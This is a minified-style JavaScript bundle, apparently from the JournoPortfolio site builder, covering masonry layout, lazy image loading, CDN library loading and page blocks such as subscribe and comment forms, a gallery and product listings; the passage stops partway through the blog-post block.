var MiniMasonry = function(t) {
    return this._sizes = [], this._columns = [], this._container = null, this._count = null, this._width = 0, this._resizeTimeout = null, this.conf = {
        baseWidth: 255,
        gutterX: null,
        gutterY: null,
        gutter: 10,
        container: null,
        minify: !0,
        ultimateGutter: 5,
        surroundingGutter: !0
    }, this.init(t), this
};
MiniMasonry.prototype.init = function(t) {
    for (var i in this.conf) null != t[i] && (this.conf[i] = t[i]);
    if (null != this.conf.gutterX && null != this.conf.gutterY || (this.conf.gutterX = this.conf.gutterY = this.conf.gutter), this._gutterX = this.conf.gutterX, this._container = document.querySelector(this.conf.container), !this._container) throw new Error("Container not found or missing");
    window.addEventListener("resize", this.resizeThrottler.bind(this)), this.layout()
}, MiniMasonry.prototype.reset = function() {
    this._sizes = [], this._columns = [], this._count = null, this._width = this._container.clientWidth;
    var t = this.conf.baseWidth;
    this._width < t && (this._width = t, this._container.style.minWidth = t + "px"), 1 == this.getCount() ? (this.conf._gutterX = this.conf.gutterX, this.conf.gutterX = this.conf.ultimateGutter, this._count = 1) : this.conf.gutterX = this._gutterX
}, MiniMasonry.prototype.getCount = function() {
    return this.conf.surroundingGutter ? Math.floor((this._width - this.conf.gutterX) / (this.conf.baseWidth + this.conf.gutterX)) : Math.floor((this._width + this.conf.gutterX) / (this.conf.baseWidth + this.conf.gutterX))
}, MiniMasonry.prototype.computeWidth = function() {
    var t;
    return t = this.conf.surroundingGutter ? (this._width - this.conf.gutterX) / this._count - this.conf.gutterX : (this._width + this.conf.gutterX) / this._count - this.conf.gutterX, Number.parseInt(t.toFixed(2))
}, MiniMasonry.prototype.layout = function() {
    if (this._container) {
        this.reset(), null == this._count && (this._count = this.getCount());
        for (var t = this.computeWidth(), i = 0; i < this._count; i++) this._columns[i] = 0;
        for (var n = this._container.querySelectorAll(this.conf.container + " > *"), s = 0; s < n.length; s++) n[s].style.width = t + "px", this._sizes[s] = n[s].clientHeight;
        var o = this.conf.surroundingGutter ? this.conf.gutterX : 0;
        if (this._count > this._sizes.length) {
            var e = this._sizes.length * (t + this.conf.gutterX) - this.conf.gutterX;
            o = (this._width - e) / 2
        }
        for (var r = 0; r < n.length; r++) {
            var h = this.conf.minify ? this.getShortest() : this.getNextColumn(r),
                u = 0;
            (this.conf.surroundingGutter || h != this._columns.length) && (u = this.conf.gutterX);
            var c = o + (t + u) * h,
                l = this._columns[h];
            n[r].style.transform = "translate3d(" + Math.round(c) + "px," + Math.round(l) + "px,0)", this._columns[h] += this._sizes[r] + this.conf.gutterY
        }
        this._container.style.height = this._columns[this.getLongest()] - this.conf.gutterY + "px"
    } else console.error("Container not found")
}, MiniMasonry.prototype.getNextColumn = function(t) {
    return t % this._columns.length
}, MiniMasonry.prototype.getShortest = function() {
    for (var t = 0, i = 0; i < this._count; i++) this._columns[i] < this._columns[t] && (t = i);
    return t
}, MiniMasonry.prototype.getLongest = function() {
    for (var t = 0, i = 0; i < this._count; i++) this._columns[i] > this._columns[t] && (t = i);
    return t
}, MiniMasonry.prototype.resizeThrottler = function() {
    this._resizeTimeout || (this._resizeTimeout = setTimeout(function() {
        this._resizeTimeout = null, this._container.clientWidth != this._width && this.layout()
    }.bind(this), 33))
};
var journoPortfolio = function() {
    const loaded = [],
        inProgress = {},
        blocks = [];
    var animateInterval, animateInElements = [],
        animateObserver = new IntersectionObserver((function(entries, observer) {
            entries.forEach((function(entry) {
                entry.isIntersecting ? animateInElements.push(entry.target) : -1 !== animateInElements.indexOf(entry.target) && animateInElements.splice(animateInElements.indexOf(entry.target), 1)
            }))
        }), {
            root: document,
            rootMargin: "0px 0px 0px 0px"
        }),
        imageObserver = new IntersectionObserver((function(entries, observer) {
            entries.forEach((function(entry) {
                if (entry.isIntersecting) {
                    var image = entry.target;
                    image.dataset.src ? (image.src = image.dataset.src, delete image.dataset.src) : "slideshow" === image.dataset.layout && (image.querySelectorAll("[data-src]").forEach(($el => {
                        $el.dataset.src && ($el.src = $el.dataset.src, delete $el.dataset.src), imageObserver.unobserve($el)
                    })), image.querySelectorAll("[data-background-src]").forEach(($el => {
                        $el.dataset.backgroundSrc && ($el.style.backgroundImage = "url(" + $el.dataset.backgroundSrc + ")", delete $el.dataset.backgroundSrc), imageBGObserver.unobserve($el)
                    }))), imageObserver.unobserve(entry.target)
                }
            }))
        }), {
            root: document,
            rootMargin: "0px 0px 300px 0px"
        }),
        imageBGObserver = new IntersectionObserver((function(entries, observer) {
            entries.forEach((function(entry) {
                if (entry.isIntersecting) {
                    var image = entry.target;
                    image.dataset.backgroundSrc && (image.style.backgroundImage = "url(" + image.dataset.backgroundSrc + ")", delete image.dataset.backgroundSrc), imageBGObserver.unobserve(image)
                }
            }))
        }), {
            root: document,
            rootMargin: "0px 0px 300px 0px"
        });
    return {
        reInitializeBlock: function reInitializeBlock($block) {
            $block.dataset.definitionName in blocks && blocks[$block.dataset.definitionName].initialize($block), $block.querySelectorAll(".animate-in").forEach(($el => {
                animateInElements.push($el)
            })), $block.querySelectorAll("[data-src]").forEach(($el => {
                $el.dataset.src && ($el.src = $el.dataset.src, delete $el.dataset.src)
            })), $block.querySelectorAll("[data-background-src]").forEach(($el => {
                $el.dataset.backgroundSrc && ($el.style.backgroundImage = "url(" + $el.dataset.backgroundSrc + ")", delete $el.dataset.backgroundSrc)
            }))
        },
        resetAnimation: function resetAnimation() {
            clearInterval(animateInterval), animateInElements = [], document.querySelectorAll(".animate-in").forEach(($el => {
                animateInElements.push($el)
            }));
            var delay = parseFloat(getComputedStyle(document.querySelector("html")).getPropertyValue("--jp-animation-delay"));
            animateInterval = setInterval((function() {
                animateInElements.length > 0 && animateInElements.shift().classList.add("animate-in-go")
            }), delay)
        },
        requireLibrary: function requireLibrary(libName) {
            return new Promise(((resolve, reject) => {
                let url = function libName2URL(libName) {
                    switch (libName) {
                        case "mapbox":
                            return "https://api.mapbox.com/mapbox-gl-js/v2.1.1/mapbox-gl.js";
                        case "mux-player":
                            return "https://unpkg.com/@mux/mux-player@1.3.0/dist/mux-player.js";
                        case "grecaptcha":
                            return `https://www.google.com/recaptcha/api.js?render=${window.PORTFOLIO_CAPTCHA_PUBLIC_KEY}`;
                        case "reframe":
                            return "https://static.journoportfolio.com/public/js/reframe-2.min.js";
                        case "pdfobject":
                            return "https://static.journoportfolio.com/public/js/pdfobject-201604172.min.js";
                        case "macy":
                            return "https://static.journoportfolio.com/public/js/macy-1.0.0.js";
                        case "swiper":
                            return "https://static.journoportfolio.com/public/js/swiper-6.4.11.min.js";
                        case "axios":
                            return "https://static.journoportfolio.com/public/js/axios-0.21.1.min.js"
                    }
                }(libName);
                url && function loadScript(libName, url, resolve) {
                    if (-1 !== loaded.indexOf(libName)) return resolve();
                    if (libName in inProgress) return void inProgress[libName].push(resolve);
                    inProgress[libName] = [resolve];
                    var script = document.createElement("script");
                    script.onload = function() {
                        loaded.push(libName);
                        for (var i = 0; i < inProgress[libName].length; i++) inProgress[libName][i]();
                        delete inProgress[libName]
                    }, script.src = url, document.head.appendChild(script)
                }(libName, url, resolve)
            }))
        },
        articleClick: function articleClick(id) {
            return new Promise(((resolve, reject) => {
                if (window.IS_OWNER) resolve();
                else try {
                    fetch("/_analytics/articles/" + id + "/").then((function() {
                        resolve()
                    })).catch((function() {
                        resolve()
                    }))
                } catch {
                    resolve()
                }
            }))
        },
        registerBlock: function registerBlock(typeID, func) {
            blocks[typeID] = func
        },
        newContent: function newContent($elParent) {
            $elParent.querySelectorAll(".animate-in").forEach(($el => {
                animateObserver.observe($el)
            })), $elParent.querySelectorAll("[data-src]").forEach(($el => {
                $el.dataset.src && imageObserver.observe($el)
            })), $elParent.querySelectorAll("[data-layout=slideshow]").forEach(($el => {
                imageObserver.observe($el)
            })), $elParent.querySelectorAll("[data-background-src]").forEach(($el => {
                $el.dataset.backgroundSrc && imageBGObserver.observe($el)
            }))
        },
        redoExpand: function redoExpand($block) {
            var $el = $block.firstElementChild;
            $el.dataset.collapsed && $block.nextElementSibling && $block.nextElementSibling.classList.add("collapsed"), $el.onclick = function(e) {
                $el.dataset.collapsed ? ($el.removeAttribute("data-collapsed"), $block.nextElementSibling && $block.nextElementSibling.classList.remove("collapsed")) : ($el.dataset.collapsed = "true", $block.nextElementSibling && $block.nextElementSibling.classList.add("collapsed"))
            }
        },
        init: function init() {
            document.addEventListener("DOMContentLoaded", (function() {
                !0, document.querySelectorAll(".block").forEach(($block => {
                    $block.dataset.definitionName in blocks && blocks[$block.dataset.definitionName].initialize($block)
                })), document.querySelectorAll(".animate-in").forEach(($el => {
                    animateObserver.observe($el)
                })), document.querySelector("[data-language-picker]") && document.querySelectorAll("[data-language-picker]").forEach(($el => {
                    $el.onchange = function() {
                        window.location = "/" + $el.value + $el.dataset.path
                    }
                })), document.querySelectorAll("[data-layout=slideshow]").forEach(($el => {
                    imageObserver.observe($el)
                })), document.querySelectorAll("[data-src]").forEach(($el => {
                    $el.dataset.src && imageObserver.observe($el)
                })), document.querySelectorAll("[data-background-src]").forEach(($el => {
                    $el.dataset.backgroundSrc && imageBGObserver.observe($el)
                }));
                var delay = parseFloat(getComputedStyle(document.querySelector("html")).getPropertyValue("--jp-animation-delay"));
                animateInterval = setInterval((function() {
                    animateInElements.length > 0 && animateInElements.shift().classList.add("animate-in-go")
                }), delay)
            }))
        },
        cart: null
    }
}();
journoPortfolio.registerBlock("PDF", {
    initialize: function initialize(block) {
        ! function executeBlockCode(block) {
            function performSwitch() {
                if (!("PDF Viewer" in navigator.plugins)) {
                    var $e = block.querySelector("object");
                    if ($e) {
                        var height = $e.height;
                        height < 400 && (height = 400), $e.parentNode.insertAdjacentElement("beforebegin", $e.children[0]), setTimeout((function() {
                            $e.parentNode.removeChild($e), block.querySelector("iframe").style.width = "100%", block.querySelector("iframe").style.height = height + "px"
                        }), 1e3)
                    }
                }
            }
            /^((?!chrome|android).)*safari/i.test(navigator.userAgent) ? setTimeout((function() {
                performSwitch()
            }), 500) : performSwitch()
        }(block)
    }
}), journoPortfolio.registerBlock("Subscribe Form", {
    initialize: function initialize(block) {
        ! function executeBlockCode(block) {
            var $modal = block.querySelector(".content-modal");
            if ($modal) var $form = $modal;
            else $form = block;

            function escPress(e) {
                "Escape" === e.key && closeModal()
            }

            function closePress(e) {
                closeModal()
            }

            function clickBg(e) {
                e.target === this && closeModal()
            }

            function closeModal() {
                $modal.classList.remove("open"), document.removeEventListener("keyup", escPress)
            }

            function openModal() {
                document.body.appendChild($modal), $modal.clientHeight, $modal.classList.add("open"), $modal.removeAttribute("hidden"), $modal.onclick = clickBg, $modal.querySelector(".close").onclick = closePress, document.addEventListener("keyup", escPress)
            }
            block.querySelector(".open-subscribe-form") && (block.querySelector(".open-subscribe-form").onclick = function() {
                openModal()
            }), Promise.all([journoPortfolio.requireLibrary("grecaptcha"), journoPortfolio.requireLibrary("axios")]).then((function() {
                var loading = !1;
                block.querySelector("form") && (block.querySelector("form").onsubmit = function(e) {
                    e.preventDefault(), loading || (loading = !0, $form.querySelector("button").classList.add("saving"), $form.querySelectorAll("input,textarea").forEach((function($el) {
                        $el.parentElement.classList.remove("error")
                    })), grecaptcha.ready((function() {
                        grecaptcha.execute(window.PORTFOLIO_CAPTCHA_PUBLIC_KEY, {
                            action: "submit"
                        }).then((function(token) {
                            var data = {
                                email: $form.querySelector("input[name=email]").value,
                                block: Number(block.dataset.id),
                                captcha_token: token
                            };
                            $form.querySelector("input[name=name]") && (data.name = $form.querySelector("input[name=name]").value), axios.post("/api/v1/subscribe/", data).then((function(data) {
                                var $form1 = $form.querySelector("form"),
                                    $success = $form.querySelector(".success-message");
                                $success.style.height = $form1.offsetHeight + "px", $success.style.width = $form1.offsetWidth + "px", $success.style.display = "block", $form1.remove()
                            })).catch((function(error) {
                                if (error.response) {
                                    if (400 === error.response.status) {
                                        for (name in errors = error.response.data, errors) $form.querySelector("input[name=" + name + "]").parentElement.classList.add("error"), $form.querySelector("input[name=" + name + "]").parentElement.querySelector(".field__error").innerHTML = errors[name][0];
                                        console.log(error.response.data)
                                    }
                                } else error.request ? console.log(error.request) : console.log("Error", error.message)
                            })).finally((function() {
                                loading = !1, $form.querySelector("button") && $form.querySelector("button").classList.remove("saving")
                            }))
                        }))
                    })))
                })
            }))
        }(block)
    }
}), journoPortfolio.registerBlock("Blog Post Footer", {
    initialize: function initialize(block) {
        ! function executeBlockCode(block) {
            Promise.all([journoPortfolio.requireLibrary("grecaptcha"), journoPortfolio.requireLibrary("axios")]).then((function() {
                var $modal = block.querySelector(".content-modal");

                function closeModal() {
                    $modal.classList.remove("open"), document.removeEventListener("keyup", escPress)
                }

                function escPress(e) {
                    "Escape" === e.key && closeModal()
                }

                function closePress(e) {
                    closeModal()
                }

                function clickBg(e) {
                    e.target === this && closeModal()
                }

                function openModal() {
                    document.body.appendChild($modal), $modal.clientHeight, $modal.classList.add("open"), $modal.removeAttribute("hidden"), $modal.onclick = clickBg, $modal.querySelector(".close").onclick = closePress, document.addEventListener("keyup", escPress), $modal.querySelector("#comment-form").onsubmit = function(e) {
                        e.preventDefault(), $modal.querySelectorAll("input,textarea").forEach((function($el) {
                            $el.parentElement.classList.remove("error")
                        })), $modal.querySelector("button").classList.add("saving"), grecaptcha.ready((function() {
                            grecaptcha.execute(window.PORTFOLIO_CAPTCHA_PUBLIC_KEY, {
                                action: "submit"
                            }).then((function(token) {
                                var data = {
                                    name: $modal.querySelector("#comment_name").value,
                                    email: $modal.querySelector("#comment_email").value,
                                    content: $modal.querySelector("#comment_content").value,
                                    article: window.ARTICLE_ID,
                                    captcha_token: token
                                };
                                axios.post("/api/v1/comments/", data).then((data => {
                                    closeModal(), $modal.querySelector("#comment_name").value = "", $modal.querySelector("#comment_email").value = "", $modal.querySelector("#comment_content").value = "";
                                    var comment = data.data;
                                    document.querySelector(".comments").insertAdjacentHTML("beforeend", `<div class="comment new" id="comment-${comment.id}"><small class="meta">Posted on ${comment.datetime} <a class="comment__permalink" href="${window.location.pathname}#comment-${comment.id}">Permalink</a></small><h3>${comment.name}</h3>${comment.content_display}</div>`), document.querySelector(`#comment-${comment.id}`).scrollIntoView({
                                        behavior: "smooth"
                                    })
                                })).catch((error => {
                                    if (error.response) {
                                        if (400 === error.response.status) {
                                            for (name in errors = error.response.data, errors) $modal.querySelector("[name=" + name + "]").parentElement.classList.add("error"), $modal.querySelector("[name=" + name + "]").parentElement.querySelector(".field__error").innerHTML = errors[name][0];
                                            console.log(error.response.data)
                                        }
                                    } else error.request ? console.log(error.request) : console.log("Error", error.message)
                                }))
                            }))
                        }))
                    }
                }
                block.querySelector("#add-comment") && (block.querySelector("#add-comment").onclick = function() {
                    openModal()
                })
            }))
        }(block)
    }
}), journoPortfolio.registerBlock("Navigation", {
    initialize: function initialize(block) {
        ! function executeBlockCode(block) {
            function isOverflown(element) {
                return element.scrollWidth > element.clientWidth
            }

            function setupMenu() {
                var menu = block.querySelector(".menu");
                if (menu) {
                    var social = menu.querySelector(".social-icons");
                    social && (social.offsetWidth > menu.offsetWidth - 40 ? social.classList.add("hidden") : social.classList.remove("hidden"))
                }
                if (block.querySelector(".menu").classList.remove("force-navicon"), block.querySelectorAll(".menu ul > li.hidden").forEach((item => {
                        item.classList.remove("hidden")
                    })), block.querySelector(".menu > ul") && isOverflown(block.querySelector(".menu > ul")))
                    for (block.querySelector(".menu").classList.add("force-navicon"); isOverflown(block.querySelector(".menu > ul")) && block.querySelectorAll(".menu ul > li:not(.hidden)").length > 0;) {
                        var links = block.querySelectorAll(".menu ul > li:not(.hidden)");
                        links[links.length - 1].classList.add("hidden")
                    }
            }

            function setupTransparency() {
                window.scrollY > 50 ? document.body.classList.add("scrolled") : document.body.classList.remove("scrolled")
            }
            block.querySelectorAll(".navicon").forEach((function(item) {
                item.onclick = function() {
                    block.querySelector(".sidebar").classList.toggle("open"), block.querySelector(".navicon").classList.toggle("open")
                }
            })), block.querySelectorAll(".menu ul li a, .sidebar__inner a").forEach((function(item) {
                item.onclick = function(e) {
                    var href = item.getAttribute("href");
                    if (href.startsWith("/#")) {
                        e.preventDefault();
                        var y = document.getElementById(href.replace("/#", "")).getBoundingClientRect().top + window.pageYOffset - document.querySelector(".header").offsetHeight;
                        window.scrollTo({
                            top: y,
                            behavior: "smooth"
                        }), block.querySelector(".sidebar").classList.remove("open"), block.querySelector(".navicon").classList.remove("open")
                    }
                }
            })), window.onresize = setupMenu, setupMenu(), window.onscroll = setupTransparency, setupTransparency(), journoPortfolio.cart.init()
        }(block)
    }
}), journoPortfolio.registerBlock("Media Embed", {
    initialize: function initialize(block) {
        ! function executeBlockCode(block) {
            window.FB && FB.XFBML.parse(), window.instgrm && window.instgrm.Embeds.process(), window.twttr && window.twttr.widgets.load(), block.querySelector("iframe") && -1 === block.querySelector("iframe").src.indexOf("www.linkedin.com") && -1 === block.querySelector("iframe").src.indexOf("pinterest.com") && journoPortfolio.requireLibrary("reframe").then((function() {
                if (block.querySelector("iframe")) {
                    if (block.querySelector("iframe").height) {
                        var newHeight = block.offsetWidth * (block.querySelector("iframe").height / block.querySelector("iframe").width);
                        block.querySelector("iframe").style.width = "100%", block.querySelector("iframe").style.height = newHeight + "px"
                    }
                    reframe(block.querySelector("iframe"))
                }
            }))
        }(block)
    }
}), journoPortfolio.registerBlock("Slideshow", {
    initialize: function initialize(block) {
        ! function executeBlockCode(block) {
            journoPortfolio.requireLibrary("swiper").then((function() {
                var $slider = block.querySelector(".block-slider");
                if (block.querySelectorAll(".swiper-container").length) {
                    var autoplay = !1;
                    $slider.hasAttribute("autoplay") && (autoplay = {
                        delay: Number($slider.dataset.autoplayDelay),
                        disableOnInteraction: !0
                    });
                    var spaceBetween = 30;
                    "none" === $slider.dataset.spaceBetween && (spaceBetween = 0), "small" === $slider.dataset.spaceBetween && (spaceBetween = 15), "medium" === $slider.dataset.spaceBetween && (spaceBetween = 30), "large" === $slider.dataset.spaceBetween && (spaceBetween = 50), new Swiper("#block-" + block.dataset.id + " .swiper-container", {
                        direction: "horizontal",
                        loop: $slider.hasAttribute("loop"),
                        autoHeight: !0,
                        autoplay: autoplay,
                        spaceBetween: spaceBetween,
                        slidesPerView: Number($slider.dataset.slidesPerView),
                        paginationClickable: !0,
                        navigation: {
                            nextEl: ".swiper-button-next",
                            prevEl: ".swiper-button-prev"
                        }
                    })
                }
            }))
        }(block)
    }
}), journoPortfolio.registerBlock("Expand", {
    initialize: function initialize(block) {
        ! function executeBlockCode(block) {
            journoPortfolio.redoExpand(block)
        }(block)
    }
}), journoPortfolio.registerBlock("Gallery", {
    initialize: function initialize(block) {
        ! function executeBlockCode(block) {
            var $modal = block.querySelector(".content-modal");

            function reloadMacy() {
                if (document.querySelector(`#block-${block.dataset.id} .gallery-item__wrapper--nocrop`)) {
                    var width = document.querySelector(`#block-${block.dataset.id} .gallery-item__wrapper--nocrop`).offsetWidth / Number(block.children[0].dataset.columns);
                    width = Math.max(width - 30, 180), window.ONE_COLUMN_ON_MOBILE && window.innerWidth < 600 && (width = block.offsetWidth - 100), new MiniMasonry({
                        baseWidth: width,
                        gutter: 0,
                        container: `#block-${block.dataset.id} .gallery-item__wrapper--nocrop`,
                        surroundingGutter: !1
                    })
                }
            }
            block.querySelector(".gallery-item__wrapper--nocrop") && (reloadMacy(), setTimeout((function() {
                reloadMacy()
            }), 1e3)), block.querySelectorAll(".gallery-item__img").forEach((function(item) {
                item.onclick = function() {
                    var $root = item.parentElement,
                        $current = item.parentElement;

                    function sliderSlideLeft() {
                        var $prev = $current.previousElementSibling;
                        $prev || ($prev = $root.parentElement.children[$root.parentElement.children.length - 1]), $modal.querySelector("img").classList.add("transition"), setTimeout((() => {
                            $modal.querySelector("img").onload = function() {
                                $modal.querySelector("img").classList.remove("transition")
                            }, $modal.querySelector("img").setAttribute("src", $prev.dataset.imgSrc)
                        }), 300), $modal.querySelector(".caption").innerText = $prev.dataset.caption, $current = $prev
                    }

                    function sliderSlideRight() {
                        var $next = $current.nextElementSibling;
                        $next || ($next = $root.parentElement.children[0]), $modal.querySelector("img").classList.add("transition"), setTimeout((() => {
                            $modal.querySelector("img").onload = function() {
                                $modal.querySelector("img").classList.remove("transition")
                            }, $modal.querySelector("img").setAttribute("src", $next.dataset.imgSrc)
                        }), 300), $modal.querySelector(".caption").innerText = $next.dataset.caption, $current = $next
                    }

                    function sliderClose() {
                        $modal.querySelector(".gallery-modal__close").onclick = null, $modal.classList.remove("open"), document.onkeyup = null, document.body.style.overflow = "initial", document.documentElement.style.overflow = "initial"
                    }
                    $modal && (document.body.style.overflow = "hidden", document.documentElement.style.overflow = "hidden", 0 === $modal.querySelectorAll(".gallery-modal__leftarrow").length && ($modal.insertAdjacentHTML("beforeend", '<a class="gallery-modal__leftarrow">&#x2190;</a>'), $modal.insertAdjacentHTML("beforeend", '<a class="gallery-modal__rightarrow">&#x2192;</a>'), $modal.insertAdjacentHTML("beforeend", '<div class="gallery-modal__close">Close <span>✕</span></div>')), document.body.appendChild($modal), $modal.clientHeight, $modal.classList.add("open"), $modal.removeAttribute("hidden"), $modal.querySelector("img").setAttribute("src", $root.dataset.imgSrc), $modal.querySelector(".caption").innerText = $root.dataset.caption, $modal.querySelector(".gallery-modal__close").onclick = sliderClose, $modal.querySelector(".gallery-modal__leftarrow").onclick = sliderSlideLeft, $modal.querySelector(".gallery-modal__rightarrow").onclick = sliderSlideRight, document.onkeyup = function(event) {
                        switch (event.key) {
                            case "Left":
                            case "ArrowLeft":
                                sliderSlideLeft();
                                break;
                            case "Right":
                            case "ArrowRight":
                                sliderSlideRight();
                                break;
                            case "Esc":
                            case "Escape":
                                sliderClose()
                        }
                    })
                }
            }))
        }(block)
    }
}), journoPortfolio.registerBlock("Products", {
    initialize: function initialize(block) {
        ! function executeBlockCode(block) {
            var $block = block,
                $articleBlock = $block.children[0],
                $autoloader = $block.querySelector(".autoloader"),
                $inputSearch = $block.querySelector("input.search"),
                $selectOrder = $block.querySelector(".order-select"),
                loading = !1,
                $masonry = $block.querySelector(".masonry");
            $block.querySelector(".text-modal"), block.querySelector(".gallery-modal"), $block.querySelector("[data-layout=slideshow]") && journoPortfolio.requireLibrary("swiper").then((function() {
                if (block.querySelectorAll(".swiper-container").length) {
                    var autoplay = !1;
                    $articleBlock.hasAttribute("autoplay") && (autoplay = {
                        delay: Number($articleBlock.dataset.autoplayDelay),
                        disableOnInteraction: !0
                    });
                    var spaceBetween = 30;
                    "none" === $articleBlock.dataset.gutter && (spaceBetween = 0), "small" === $articleBlock.dataset.gutter && (spaceBetween = 15), "medium" === $articleBlock.dataset.gutter && (spaceBetween = 30), "large" === $articleBlock.dataset.gutter && (spaceBetween = 50);
                    var loop = $articleBlock.hasAttribute("loop");
                    $articleBlock.querySelectorAll("article").length < Number($articleBlock.dataset.slidesPerView) && (loop = !1);
                    var slidesPerView = Number($articleBlock.dataset.slidesPerView);
                    window.innerWidth < 700 && (slidesPerView = 1), new Swiper("#block-" + block.dataset.id + " .swiper-container", {
                        direction: "horizontal",
                        loop: loop,
                        autoHeight: !1,
                        autoplay: autoplay,
                        spaceBetween: spaceBetween,
                        slidesPerView: slidesPerView,
                        paginationClickable: !0,
                        navigation: {
                            nextEl: ".swiper-button-next",
                            prevEl: ".swiper-button-prev"
                        }
                    })
                }
            })), $block.querySelector(".filters-show") && ($block.querySelector(".filters-show").onclick = function() {
                $block.querySelector(".filters-show").nextElementSibling.classList.toggle("open")
            });
            var GUTTERS = {
                none: 0,
                small: 15,
                medium: 30,
                large: 50
            };

            function COLUMNS_TARGET(cols) {
                if (window.innerWidth < 600) return $articleBlock.offsetWidth - 100;
                var width = $articleBlock.offsetWidth - (Number(cols) - 1) * GUTTERS[$articleBlock.dataset.gutter];
                return Math.max(width / Number(cols), 200)
            }

            function bindProducts() {
                $articleBlock.querySelectorAll("article").forEach((function($article) {
                    if ($article.querySelector(".product__select") && $article.querySelector(".product__select").addEventListener("change", (function(event) {
                            var value = $article.querySelector(".product__select").value,
                                price = $article.querySelector(".product__select").selectedOptions[0].dataset.price;
                            $article.querySelector("[data-cart-add]").dataset.variant = value, $article.querySelector(["[data-price-display]"]).innerText = price
                        })), $article.querySelector("[data-cart-checkout]")) {
                        var $button = $article.querySelector("[data-cart-checkout]");
                        $button.onclick = function(event) {
                            event.preventDefault(), $button.dataset && $button.dataset.disabled || ($button.dataset.disabled = !0, $button.style.position = "relative", $button.innerHTML = '<span style="opacity: 0;">' + $article.querySelector("[data-cart-checkout]").innerText + '</span><span style="position: absolute;display: flex;justify-content: center;left: 0;top: 0;bottom: 0; right: 0;width: 100%;text-align: center;"><svg style="align-self: center;display: inline-block; fill: white; -webkit-animation: v-clipDelay 0.75s 0s infinite linear; animation: v-clipDelay 0.75s 0s infinite linear; -webkit-animation-fill-mode: both; animation-fill-mode: both;" xmlns="http://www.w3.org/2000/svg" height="24" width="24"><path d="M4 20v-2h2.75l-.4-.35q-1.3-1.15-1.825-2.625Q4 13.55 4 12.05q0-2.775 1.662-4.938Q7.325 4.95 10 4.25v2.1Q8.2 7 7.1 8.562 6 10.125 6 12.05q0 1.125.425 2.187Q6.85 15.3 7.75 16.2l.25.25V14h2v6Zm10-.25v-2.1q1.8-.65 2.9-2.212Q18 13.875 18 11.95q0-1.125-.425-2.188Q17.15 8.7 16.25 7.8L16 7.55V10h-2V4h6v2h-2.75l.4.35q1.225 1.225 1.788 2.662Q20 10.45 20 11.95q0 2.775-1.663 4.937Q16.675 19.05 14 19.75Z"/></svg></span>', journoPortfolio.cart.checkoutProduct($article.querySelector("[data-cart-checkout]").dataset.variant))
                        }
                    }
                    $article.querySelector("[data-cart-add]") && ($article.querySelector("[data-cart-add]").onclick = function(event) {
                        event.preventDefault(), journoPortfolio.cart.addToCart($article.querySelector("[data-cart-add]").dataset.variant)
                    })
                }))
            }

            function reloadMacy() {
                $masonry ? ($masonry.classList.remove("animate"), window.MASONRY || (window.MASONRY = {}), document.querySelector(`#block-${block.dataset.id} .masonry`) && (window.MASONRY[Number(block.dataset.id)] = new MiniMasonry({
                    baseWidth: COLUMNS_TARGET($articleBlock.dataset.columns),
                    container: `#block-${block.dataset.id} .masonry`,
                    surroundingGutter: !1,
                    gutter: GUTTERS[$articleBlock.dataset.gutter]
                }), block.querySelectorAll(".dragging").length > 0 ? $masonry.classList.add("animate") : setTimeout((function() {
                    $masonry.classList.add("animate")
                }), 500)), bindProducts()) : bindProducts()
            }

            function autoLoaderClick(e) {
                loadNextPage()
            }

            function loadNextPage() {
                $autoloader.innerText = "Loading more...", loadArticles($articleBlock.querySelectorAll("article").length)
            }

            function loadArticles(start_from) {
                if (!loading) {
                    loading = !0;
                    var searchVal = "",
                        orderVal = $articleBlock.dataset.defaultOrder;
                    "number" != typeof start_from && (start_from = 0), $inputSearch && (searchVal = $inputSearch.value), $selectOrder && (orderVal = $selectOrder.value), $selectPublication && $selectPublication.value, $selectTags && $selectTags.value, fetch("/api/v1/articles/?block=" + block.dataset.id + "&order=" + orderVal + "&start=" + start_from + "&search=" + searchVal).then((response => response.text())).then((data => {
                        loading = !1;
                        var countBefore = block.querySelectorAll(".products__wrapper article").length;
                        0 === start_from ? (countBefore = 0, block.querySelector(".products__wrapper").innerHTML = data) : block.querySelector(".products__wrapper").insertAdjacentHTML("beforeend", data), journoPortfolio.newContent(block.querySelector(".products__wrapper"));
                        var countAfter = block.querySelectorAll(".products__wrapper article").length;
                        $autoloader && ("" == data || countAfter - countBefore < 12 ? $autoloader.style.display = "none" : ($autoloader.style.display = "block", $autoloader.innerText = "Load More")), reloadMacy(), block.dispatchEvent(new Event("ArticleAPILoad"))
                    }))
                }
            }
            "IntersectionObserver" in window && (window.loadMoreObserver ? $block.dataset.id in window.loadMoreObserver && window.loadMoreObserver[$block.dataset.id].disconnect() : window.loadMoreObserver = {}, window.loadMoreObserver[$block.dataset.id] = new IntersectionObserver((function(entries, observer) {
                entries.forEach((function(entry) {
                    entry.isIntersecting && autoLoaderClick()
                }))
            }), {
                rootMargin: "0px 0px 300px 0px"
            })), $autoloader && ($autoloader.onclick = autoLoaderClick, null === $block.nextElementSibling && null === $block.parentNode.parentNode.parentNode.nextElementSibling && ($block.parentNode.parentNode.parentNode.parentNode.classList.contains("widget-render") || "IntersectionObserver" in window && (window.loadMoreObserver[$block.dataset.id].unobserve($autoloader), window.loadMoreObserver[$block.dataset.id].observe($autoloader)))), $inputSearch && ($inputSearch.onblur = loadArticles, $inputSearch.onkeyup = function(event) {
                13 === event.keyCode && (event.preventDefault(), loadArticles())
            }), $selectOrder && ($selectOrder.onchange = loadArticles), reloadMacy(), setTimeout((function() {
                reloadMacy()
            }), 500)
        }(block)
    }
}), journoPortfolio.registerBlock("Blog Post", {
    initialize: function initialize(block) {
        ! function executeBlockCode(block) {
            Promise.all([journoPortfolio.requireLibrary("grecaptcha"), journoPortfolio.requireLibrary("axios")]).then((function() {
                var $modal = block.querySelector(".content-modal");

                function closeModal() {
                    $modal.classList.remove("open"), document.removeEventListener("keyup", escPress)
                }

                function escPress(e) {
                    "Escape" === e.key && closeModal()
                }

                function closePress(e) {
                    closeModal()
                }

                function clickBg(e) {
                    e.target === this && closeModal()
                }

                function openModal() {
                    document.body.appendChild($modal), $modal.clientHeight, $modal.classList.add("open"), $modal.removeAttribute("hidden"), $modal.onclick = clickBg, $modal.querySelector(".close").onclick = closePress, document.addEventListener("keyup", escPress), $modal.querySelector("#comment-form").onsubmit = function(e) {
                        e.preventDefault(), $modal.querySelectorAll("input,textarea").forEach((function($el) {
                            $el.parentElement.classList.remove("error")
                        })), $modal.querySelector("button").classList.add("saving"), grecaptcha.ready((function() {
                            grecaptcha.execute(window.PORTFOLIO_CAPTCHA_PUBLIC_KEY, {
                                action: "submit"
                            }).then((function(token) {
                                var data = {
